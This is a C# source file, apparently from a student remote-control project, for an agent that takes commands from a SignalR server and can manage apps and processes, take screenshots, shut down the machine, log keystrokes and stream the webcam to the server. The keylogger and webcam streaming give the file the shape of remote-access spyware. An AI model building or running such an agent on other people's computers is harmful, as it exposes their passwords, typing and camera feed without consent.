using RCS.Agent.Services;
using RCS.Agent.Services.Windows;
using RCS.Common.Models;
using RCS.Common.Protocols;
using System;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace RCS.Agent
{
    class Program
    {
        private static SignalRClient _signalRClient;
        private static ApplicationManager _appManager;
        private static ProcessMonitor _processMonitor;
        private static SystemControl _systemControl;
        private static MediaCapture _mediaCapture;
        private static Keylogger _keylogger;
        private static CancellationTokenSource _webcamCts;

        private const string AGENT_ID = "Agent_12345";
        private const string SERVER_URL = "http://localhost:5000/agenthub";

        static async Task Main(string[] args)
        {
            Console.Title = $"RCS Agent - {AGENT_ID}";
            InitializeServices();
            await _signalRClient.ConnectAsync(AGENT_ID);
            Console.WriteLine("Agent is running. Press CTRL+C to exit.");
            await Task.Delay(-1);
        }

        private static void InitializeServices()
        {
            _appManager = new ApplicationManager();
            _processMonitor = new ProcessMonitor();
            _systemControl = new SystemControl();
            _mediaCapture = new MediaCapture(); // Lúc này chưa bật Webcam
            _keylogger = new Keylogger();
            _signalRClient = new SignalRClient(SERVER_URL);
            _signalRClient.OnCommandReceived += HandleCommand;
        }

        private static async Task HandleCommand(CommandMessage cmd)
        {
            Console.WriteLine($"[Command] {cmd.Action}");
            try
            {
                switch (cmd.Action)
                {
                    case ProtocolConstants.ActionAppList:
                        await SendResponse(cmd.Action, _appManager.GetInstalledApps());
                        break;
                    case ProtocolConstants.ActionAppStart:
                        _appManager.StartApp(GetParam(cmd, "name"));
                        await SendResponse(cmd.Action, "started");
                        break;
                    case ProtocolConstants.ActionAppStop:
                        _appManager.StopApp(GetParam(cmd, "name"));
                        await SendResponse(cmd.Action, "stopped");
                        break;
                    case ProtocolConstants.ActionProcessList:
                        await SendResponse(cmd.Action, _processMonitor.GetProcesses());
                        break;
                    case ProtocolConstants.ActionProcessStart:
                        _processMonitor.StartProcess(GetParam(cmd, "name"));
                        await SendResponse(cmd.Action, "started");
                        break;
                    case ProtocolConstants.ActionProcessStop:
                        if(int.TryParse(GetParam(cmd, "pid"), out int pid)) _processMonitor.KillProcess(pid);
                        await SendResponse(cmd.Action, "killed");
                        break;
                    case ProtocolConstants.ActionScreenshot:
                        await _signalRClient.SendBinaryAsync(_mediaCapture.CaptureScreenBase64());
                        break;
                    case ProtocolConstants.ActionShutdown:
                        _systemControl.Shutdown();
                        break;
                    case ProtocolConstants.ActionRestart:
                        _systemControl.Restart();
                        break;
                    case ProtocolConstants.ActionKeyloggerStart:
                        _keylogger.Start(async (key) => {
                            await _signalRClient.SendUpdateAsync(new RealtimeUpdate { Event = "key_pressed", Data = key });
                        });
                        break;
                    case ProtocolConstants.ActionKeyloggerStop:
                        _keylogger.Stop();
                        await SendResponse(cmd.Action, "stopped");
                        break;

                    // --- LOGIC WEBCAM ĐÃ SỬA ---
                    case ProtocolConstants.ActionWebcamOn:
                        if (_webcamCts == null)
                        {
                            _webcamCts = new CancellationTokenSource();
                            // Chạy vòng lặp stream
                            Task.Run(async () => await StreamWebcamLoop(_webcamCts.Token));
                        }
                        break;

                    case ProtocolConstants.ActionWebcamOff:
                        _webcamCts?.Cancel(); // Dừng vòng lặp
                        _webcamCts = null;
                        await SendResponse(cmd.Action, "stopped");
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        private static async Task StreamWebcamLoop(CancellationToken token)
        {
            Console.WriteLine("[Webcam] Initializing...");
            
            // 1. Bật Webcam 1 lần duy nhất
            if (!_mediaCapture.StartWebcam())
            {
                Console.WriteLine("[Webcam] Failed to connect driver.");
                return;
            }

            Console.WriteLine("[Webcam] Streaming started.");

            // 2. Vòng lặp lấy frame
            while (!token.IsCancellationRequested)
            {
                try
                {
                    string frameBase64 = _mediaCapture.GetWebcamFrame();
                    
                    if (!string.IsNullOrEmpty(frameBase64))
                    {
                        await _signalRClient.SendBinaryAsync(frameBase64);
                    }
                    
                    // Delay 100ms (~10 FPS) để không quá tải hệ thống và file I/O
                    await Task.Delay(100, token);
                }
                catch (TaskCanceledException) { break; }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Stream Error] {ex.Message}");
                }
            }

            // 3. Tắt Webcam 1 lần duy nhất khi kết thúc
            _mediaCapture.StopWebcam();
            Console.WriteLine("[Webcam] Streaming stopped & Driver released.");
        }

        private static async Task SendResponse(string action, object data)
        {
            await _signalRClient.SendResponseAsync(new ResponseMessage { Action = action, Response = data });
        }

        private static string GetParam(CommandMessage cmd, string key)
        {
            if (cmd.Params == null) return "";
            try 
            {
                if (cmd.Params is System.Text.Json.JsonElement jsonElement)
                {
                    if (jsonElement.TryGetProperty(key, out var value)) return value.ToString();
                }
                var str = cmd.Params.ToString();
                if (str.Contains(key))
                {
                    var parts = str.Split(new[] { key, ":" }, StringSplitOptions.RemoveEmptyEntries);
                    for (int i = 0; i < parts.Length; i++)
                    {
                        if (parts[i].Contains(key) && i + 1 < parts.Length)
                           return parts[i+1].Replace("}", "").Replace("\"", "").Replace(",", "").Trim();
                    }
                     if (parts.Length > 1) 
                        return parts[1].Replace("}", "").Replace("\"", "").Replace(",", "").Trim();
                }
            }
            catch { }
            return "";
        }
    }
}